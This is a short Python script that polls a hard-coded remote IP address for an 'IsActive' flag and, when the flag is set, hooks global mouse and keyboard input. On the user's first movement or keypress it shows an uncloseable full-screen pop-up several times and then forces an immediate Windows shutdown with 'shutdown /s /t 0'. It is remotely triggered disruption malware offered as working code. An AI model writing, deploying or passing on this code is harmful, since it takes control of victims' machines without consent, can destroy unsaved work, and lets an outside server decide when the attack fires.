from pynput import mouse, keyboard
import random
import tkinter as tk
import requests
import os

message = "Hello, this is your pop-up message!"
url = "http://3.16.114.229:3000"

def display_message(message):
    # Create a root window
    root = tk.Tk()
    # Hide the root window
    root.withdraw()
    # Create a Toplevel window
    top = tk.Toplevel(root)
    # Make the Toplevel window a modal dialog
    top.grab_set()
    top.attributes('-topmost', True)
    top.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable window close button

    # Make the window full screen
    top.attributes('-fullscreen', True)

    # Display the message
    label = tk.Label(top, text=message, font=("Helvetica", 32))
    label.pack(expand=True)

    # Create an OK button
    button = tk.Button(top, text="OK", command=root.quit, font=("Helvetica", 24))
    button.pack(pady=20)

    # Run the Tkinter event loop
    root.mainloop()

    # Destroy the root window after the message box is closed
    root.destroy()

def SHUTDOWN_FUNCTION():
    print("SHUTTING DOWN!!!")
    os.system("shutdown /s /t 0")

def USER_REACTED_TRANCFER():
    for i in range(random.randint(2, 5)):  # Loop a random number of times between 2 and 5
        display_message(message)

    SHUTDOWN_FUNCTION()

TrancferedAlready = False
def USER_REACTED(x=None, y=None, z=None, k=None):
    global TrancferedAlready
    mouse_listener.stop()
    keyboard_listener.stop()

    if not TrancferedAlready:
        TrancferedAlready = True
        USER_REACTED_TRANCFER()

mouse_listener = mouse.Listener(
    on_move=USER_REACTED,
    on_click=USER_REACTED,
    on_scroll=USER_REACTED)
keyboard_listener = keyboard.Listener(
    on_press=USER_REACTED,
    on_release=USER_REACTED)

try:
    response = requests.get(url + "/status")
    data = response.json()  # Assuming the response is in JSON format
    isactive = data['IsActive']
    # isactive = True

    if isactive:
        mouse_listener.start()
        keyboard_listener.start()

        # Keep the program running
        mouse_listener.join()
        keyboard_listener.join()
    else:
        print("not active")

except Exception as e:
    print(f"An exception occurred: {e}")
